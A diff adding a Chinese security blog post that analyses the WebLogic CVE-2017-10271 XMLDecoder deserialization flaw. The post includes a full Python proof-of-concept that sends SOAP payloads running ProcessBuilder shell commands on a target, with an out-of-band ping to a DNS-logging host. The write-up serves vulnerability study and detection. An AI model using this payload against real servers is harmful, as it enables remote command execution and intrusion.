@@ -1,0 +1,344 @@
+<!DOCTYPE html>
+<html lang="zh">
+
+<head>
+            <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="description" content="">
+        <meta name="author" content="">
+
+        <title>JenI's Blog</title>
+
+        <link rel="icon" href="https://blog.jenisec.org/theme/images/favicon.ico" type="image/x-icon">  
+        <link rel="shortcut icon" href="https://blog.jenisec.org/theme/images/favicon.ico" type="image/x-icon">  
+
+
+        <link href="https://blog.jenisec.org/theme/css/iconfont.css" rel="stylesheet">
+
+        <!-- Bootstrap Core CSS -->
+        <link href="https://blog.jenisec.org/theme/css/bootstrap.min.css" rel="stylesheet">
+
+        <!-- Custom CSS -->
+        <link href="https://blog.jenisec.org/theme/css/clean-blog.min.css" rel="stylesheet">
+
+        <!-- Code highlight color scheme -->
+            <link href="https://blog.jenisec.org/theme/css/code_blocks/monokai.css" rel="stylesheet">
+
+        <!-- Custom Fonts -->
+        <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.1.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+        <link href='https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
+        <link href='https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>
+
+        <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+        <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+        <!--[if lt IE 9]>
+            <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+            <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+        <![endif]-->
+
+
+
+
+
+
+			<meta property="og:locale" content="zh">
+		<meta property="og:site_name" content="JenI's Blog">
+
+	<meta property="og:type" content="article">
+	<meta property="article:author" content="">
+	<meta property="og:url" content="https://blog.jenisec.org/security/weblogic-wls-wsat-rce.html">
+	<meta property="og:title" content="WebLogic XMLDecoder 反序列化漏洞分析">
+	<meta property="og:description" content="">
+	<meta property="og:image" content="https://blog.jenisec.org/../theme/images/posts/weblogic/weblogic-cover.png">
+	<meta property="article:published_time" content="2017-12-26 00:00:00+08:00">
+</head>
+
+<body style="background-color: #f8f8f8">
+
+    <!-- Navigation -->
+    <nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+        <div class="container-fluid">
+            <!-- Brand and toggle get grouped for better mobile display -->
+            <div class="navbar-header page-scroll">
+                <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
+                    <span class="sr-only">Toggle navigation</span>
+                    <span class="icon-bar"></span>
+                    <span class="icon-bar"></span>
+                    <span class="icon-bar"></span>
+                </button>
+                <a class="navbar-brand" href="https://blog.jenisec.org/">JenI's Blog</a>
+            </div>
+
+            <!-- Collect the nav links, forms, and other content for toggling -->
+            <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
+                <ul class="nav navbar-nav navbar-right">
+                        <li><a href="https://blog.jenisec.org/category/ji-qi-xue-xi.html">机器学习</a></li>
+                        <li><a href="https://blog.jenisec.org/category/an-quan.html">安全</a></li>
+                        <li><a href="https://blog.jenisec.org/category/xi-tong.html">系统</a></li>
+                        <li><a href="https://blog.jenisec.org/category/ri-chang.html">日常</a></li>
+
+                </ul>
+            </div>
+            <!-- /.navbar-collapse -->
+        </div>
+        <!-- /.container -->
+    </nav>
+
+    <!-- Page Header -->
+        <header class="intro-header" style="background-image: url('../theme/images/posts/weblogic/weblogic-cover.png')">
+        <div class="container">
+            <div class="row">
+                <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                    <div class="post-heading">
+                        <h1>WebLogic XMLDecoder 反序列化漏洞分析</h1>
+                        <span class="meta">Posted by
+                                <a href="https://blog.jenisec.org/author/jeni.html">JenI</a>
+                             on 2017-12-26 00:00:00+08:00
+                        </span>
+                        
+                    </div>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <!-- Main Content -->
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1" style="background-color: #f8f8f8;position: relative;">
+    <!-- Post Content -->
+    <article style="background-color: #f8f8f8;position: relative;">
+        <p><strong><em>前言</em></strong></p>
+<p>WebLogic是美国Oracle公司出品的一个应用服务器，确切的说是一个基于JAVAEE架构的中间件，WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。将Java的动态功能和Java Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中。</p>
+<p>在 2015 年，WebLogic 曾被爆出反序列化漏洞，漏洞编号为 CVE-2015-4852，官方针对该漏洞发布了相应的补丁，但由于是采用黑名单方式过滤危险的反序列化类，所以存在被绕过的可能。2016 年的 CVE-2016-0638、今年 1 月份的 CVE-2017-3248，还有今天要说的 CVE-2017-10271，都是由于绕过了黑名单，通过未被过滤的反序列化类在目标机器上执行命令。</p>
+<p>目前已发现大量攻击者利用这些漏洞入侵服务器后，投放木马进行挖矿。攻击者通过 WebLogic 反序列化漏洞执行系统命令，远程下载恶意脚本，随后恶意脚本主动连接攻击者网站下载挖矿木马进行挖矿。</p>
+<p>下面是针对 CVE-2017-10271 的漏洞分析。</p>
+<p><strong><em>漏洞分析</em></strong></p>
+<p>漏洞的利用点在 wls-wsat 这个 war 文件提供的 web service 服务上，根据文件内的 web.xml 内容可以看到一共存在八个可攻击点：分别为 CoordinatorPortType，CoordinatorPortType11，RegistrationPortTypeRPC，RegistrationPortTypeRPC11，ParticipantPortType，ParticipantPortType11，RegistrationRequesterPortType，RegistrationRequesterPortType11。
+<div align="center"><img class="img-responsive" src="http://og1ifa4lj.bkt.clouddn.com/weblogic/weblogic-rce-1.png" alt="weblogic-rce-1" /></div></p>
+<p>这些 servlet 接受客户端传来的 XML 格式的 POST 数据包，然后将数据包交由 weblogic.jar 中的 WorkContextServerTube 类进行处理，该类位于 weblogic.wsee.jaxws.workcontext 中。</p>
+<p>WorkContextServerTube 类使用 processRequest 方法对 POST 数据包中的 XML 数据进行解析：
+<div align="center"><img class="img-responsive" src="http://og1ifa4lj.bkt.clouddn.com/weblogic/weblogic-rce-2.png" alt="weblogic-rce-2" /></div></p>
+<p>localHeader1 变量为 XML 数据中 &lt;work:WorkContext&gt;…&lt;/work:WorkContext&gt; 标签内的内容。该部分内容被传入到 readHeaderOld 函数中，该函数源码如下：
+<div align="center"><img class="img-responsive" src="http://og1ifa4lj.bkt.clouddn.com/weblogic/weblogic-rce-3.png" alt="weblogic-rce-3" /></div></p>
+<p>此时 ByteArrayInputStream(localByteArrayOutputStream.toByteArray()) 为可执行的 XML 内容，该内容被传递到 WorkContextXmlInputAdapter() 类的 XMLDecoder. readObject() 方法，从而导致反序列过程中的代码执行。</p>
+<p><strong><em>漏洞验证</em></strong></p>
+<p>搭建 WebLogic Server，确认其可以被正常访问。
+<div align="center"><img class="img-responsive" src="http://og1ifa4lj.bkt.clouddn.com/weblogic/weblogic-rce-4.png" alt="weblogic-rce-4" /></div></p>
+<p>将浏览器代理到 BurpSuite，访问 /wls-wsat/CoordinatorPortType 页面，修改数据包为 POST 数据包，Content-type 为 text/xml，POST 数据填充为漏洞利用 POC，如下：
+<div align="center"><img class="img-responsive" src="http://og1ifa4lj.bkt.clouddn.com/weblogic/weblogic-rce-5.png" alt="weblogic-rce-5" /></div></p>
+<p>发送数据包，服务器成功弹出计算器。
+<div align="center"><img class="img-responsive" src="http://og1ifa4lj.bkt.clouddn.com/weblogic/weblogic-rce-6.png" alt="weblogic-rce-6" /></div></p>
+<p><strong><em>漏洞验证 POC</em></strong></p>
+<p>在脚本中修改 <a href="http://ceye.io/profile">http://ceye.io/profile</a> 页面的 identifier(需注册账号)，在 <a href="http://ceye.io/records/dns">http://ceye.io/records/dns</a> 页面查看结果</p>
+<p>使用方法： python weblogic-rce.py ip:port</p>
+<p>如果存在如下图所示结果，说明存在漏洞。
+<div align="center"><img class="img-responsive" src="http://og1ifa4lj.bkt.clouddn.com/weblogic/weblogic-rce-7.png" alt="weblogic-rce-7" /></div></p>
+<div class="highlight"><pre><span></span><span class="c1"># coding:utf-8</span>
+
+<span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+
+<span class="c1"># http://ceye.io/profile 页面的 identifier</span>
+<span class="n">identifier</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
+<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="s1">&#39;User-Agent&#39;</span><span class="p">:</span> <span class="s1">&#39;Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0&#39;</span><span class="p">,</span>
+    <span class="s1">&#39;Accept&#39;</span><span class="p">:</span> <span class="s1">&#39;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#39;</span><span class="p">,</span>
+    <span class="s1">&#39;Accept-Language&#39;</span><span class="p">:</span> <span class="s1">&#39;zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3&#39;</span><span class="p">,</span>
+    <span class="s1">&#39;Content-Type&#39;</span><span class="p">:</span> <span class="s1">&#39;text/xml;charset=UTF-8&#39;</span>
+    <span class="p">}</span>
+
+<span class="k">def</span> <span class="nf">check</span><span class="p">(</span><span class="n">target</span><span class="p">):</span>
+    <span class="n">ip</span> <span class="o">=</span> <span class="n">target</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;:&#39;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
+    <span class="n">port</span> <span class="o">=</span> <span class="n">target</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;:&#39;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span>
+    <span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;http://&#39;</span> <span class="o">+</span> <span class="n">target</span> <span class="o">+</span> <span class="s1">&#39;/wls-wsat/CoordinatorPortType&#39;</span>
+    <span class="n">windows_post_str</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;</span>
+<span class="s1">    &lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;</span>
+<span class="s1">      &lt;soapenv:Header&gt;</span>
+<span class="s1">        &lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;</span>
+<span class="s1">          &lt;java&gt;</span>
+<span class="s1">            &lt;object class=&quot;java.lang.ProcessBuilder&quot;&gt;</span>
+<span class="s1">              &lt;array class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt;</span>
+<span class="s1">                &lt;void index=&quot;0&quot;&gt;</span>
+<span class="s1">                  &lt;string&gt;cmd&lt;/string&gt;</span>
+<span class="s1">                &lt;/void&gt;</span>
+<span class="s1">                &lt;void index=&quot;1&quot;&gt;</span>
+<span class="s1">                  &lt;string&gt;/c&lt;/string&gt;</span>
+<span class="s1">                &lt;/void&gt;</span>
+<span class="s1">                &lt;void index=&quot;2&quot;&gt;</span>
+<span class="s1">                  &lt;string&gt;ping {ip}_{port}.{identifier} -n 2&lt;/string&gt;</span>
+<span class="s1">                &lt;/void&gt;</span>
+<span class="s1">              &lt;/array&gt;</span>
+<span class="s1">              &lt;void method=&quot;start&quot;/&gt;</span>
+<span class="s1">            &lt;/object&gt;</span>
+<span class="s1">          &lt;/java&gt;</span>
+<span class="s1">        &lt;/work:WorkContext&gt;</span>
+<span class="s1">      &lt;/soapenv:Header&gt;</span>
+<span class="s1">      &lt;soapenv:Body/&gt;</span>
+<span class="s1">    &lt;/soapenv:Envelope&gt;</span>
+<span class="s1">    &#39;&#39;&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">ip</span><span class="o">=</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="n">port</span><span class="p">,</span> <span class="n">identifier</span><span class="o">=</span><span class="n">identifier</span><span class="p">)</span>
+    <span class="n">linux_post_str</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;</span>
+<span class="s1">    &lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;</span>
+<span class="s1">      &lt;soapenv:Header&gt;</span>
+<span class="s1">        &lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;</span>
+<span class="s1">          &lt;java&gt;</span>
+<span class="s1">            &lt;object class=&quot;java.lang.ProcessBuilder&quot;&gt;</span>
+<span class="s1">              &lt;array class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt;</span>
+<span class="s1">                &lt;void index=&quot;0&quot;&gt;</span>
+<span class="s1">                  &lt;string&gt;/bin/bash&lt;/string&gt;</span>
+<span class="s1">                &lt;/void&gt;</span>
+<span class="s1">                &lt;void index=&quot;1&quot;&gt;</span>
+<span class="s1">                  &lt;string&gt;-c&lt;/string&gt;</span>
+<span class="s1">                &lt;/void&gt;</span>
+<span class="s1">                &lt;void index=&quot;2&quot;&gt;</span>
+<span class="s1">                  &lt;string&gt;&amp;quot;ping {ip}_{port}.{identifier} -c 2&amp;quot;&lt;/string&gt;</span>
+<span class="s1">                &lt;/void&gt;</span>
+<span class="s1">              &lt;/array&gt;</span>
+<span class="s1">              &lt;void method=&quot;start&quot;/&gt;</span>
+<span class="s1">            &lt;/object&gt;</span>
+<span class="s1">          &lt;/java&gt;</span>
+<span class="s1">        &lt;/work:WorkContext&gt;</span>
+<span class="s1">      &lt;/soapenv:Header&gt;</span>
+<span class="s1">      &lt;soapenv:Body/&gt;</span>
+<span class="s1">    &lt;/soapenv:Envelope&gt;</span>
+<span class="s1">    &#39;&#39;&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">ip</span><span class="o">=</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="n">port</span><span class="p">,</span> <span class="n">identifier</span><span class="o">=</span><span class="n">identifier</span><span class="p">)</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">windows_post_str</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">10</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
+    <span class="k">except</span><span class="p">:</span>
+        <span class="k">pass</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">linux_post_str</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">10</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
+    <span class="k">except</span><span class="p">:</span>
+        <span class="k">pass</span>
+
+<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+    <span class="n">target</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+    <span class="n">check</span><span class="p">(</span><span class="n">target</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+    <span class="n">main</span><span class="p">()</span>
+</pre></div>
+
+
+<p><strong><em>参考</em></strong></p>
+<blockquote>
+<p><a href="https://www.anquanke.com/post/id/92003">https://www.anquanke.com/post/id/92003</a></p>
+</blockquote>
+        <hr />
+        <p>作者:JenI&#160; &#160; &#160; &#160;转载请注明出处，谢谢</p>
+    </article>
+
+    <hr>
+
+        <div class="comments">
+            <h2>Comments !</h2>
+            <div id="disqus_thread"></div>
+            <script type="text/javascript">
+                var disqus_shortname = 'jenihk';
+                var disqus_identifier = 'security/weblogic-wls-wsat-rce.html';
+                var disqus_url = 'https://blog.jenisec.org/security/weblogic-wls-wsat-rce.html';
+                (function() {
+                    var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+                    dsq.src = '//jenihk.disqus.com/embed.js';
+                    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+                })();
+            </script>
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+ <!--                   
+    <div id="disqus_thread"></div>
+    <script>
+
+/**
+*  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+*  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables*/
+/*
+var disqus_config = function () {
+this.page.url = PAGE_URL;  // Replace PAGE_URL with your page's canonical URL variable
+this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+};
+*/
+        (function() { // DON'T EDIT BELOW THIS LINE
+            var d = document, s = d.createElement('script');
+            s.src = '//jenihk.disqus.com/embed.js';
+            s.setAttribute('data-timestamp', +new Date());
+            (d.head || d.body).appendChild(s);
+        })();
+    </script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+-->
+            </div>
+        </div>
+    </div>
+
+    <hr>
+
+    <!-- Footer -->
+    <footer>
+        <div class="container">
+            <div class="row">
+                <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                    <ul class="list-inline text-center">
+                        <li>
+                            <a href="http://weibo.com/1992014191/profile?rightmod=1&wvr=6&mod=personinfo&is_all=1">
+                                <span class="fa-stack fa-lg">
+                                    <i class="icon iconfont">&#xe657;</i>
+                                </span>
+                            </a>
+                        </li>
+                        <li>
+                            <a href="http://github.com/jenihk">
+                                <span class="fa-stack fa-lg">
+                                    <i class="icon iconfont">&#xe618;</i>
+                                </span>
+                            </a>
+                        </li>
+                    </ul>
+                    <p class="copyright text-muted">Blog powered by <a href="http://getpelican.com">Pelican</a>,
+                which takes great advantage of <a href="http://python.org">Python</a>.</p>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <!-- jQuery -->
+    <script src="https://blog.jenisec.org/theme/js/jquery.js"></script>
+
+    <!-- Bootstrap Core JavaScript -->
+    <script src="https://blog.jenisec.org/theme/js/bootstrap.min.js"></script>
+
+    <!-- Custom Theme JavaScript -->
+    <script src="https://blog.jenisec.org/theme/js/clean-blog.min.js"></script>
+    
+    <!-- CanvasParticles -->
+    <script src="https://blog.jenisec.org/theme/js/canvas-particle.js"></script>
+
+    
+
+    <script type="text/javascript">
+        CanvasParticle();
+    </script>
+
+    <script type="text/javascript">
+    var _gaq = _gaq || [];
+    _gaq.push(['_setAccount', 'UA-85780345-1']);
+    _gaq.push(['_trackPageview']);
+    (function() {
+        var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+        ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+        var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+    })();
+    </script>
+<script type="text/javascript">
+    var disqus_shortname = 'jenihk';
+    (function () {
+        var s = document.createElement('script'); s.async = true;
+        s.type = 'text/javascript';
+        s.src = '//' + disqus_shortname + '.disqus.com/count.js';
+        (document.getElementsByTagName('HEAD')[0] || document.getElementsByTagName('BODY')[0]).appendChild(s);
+    }());
+</script>
+</body>
+
+</html>
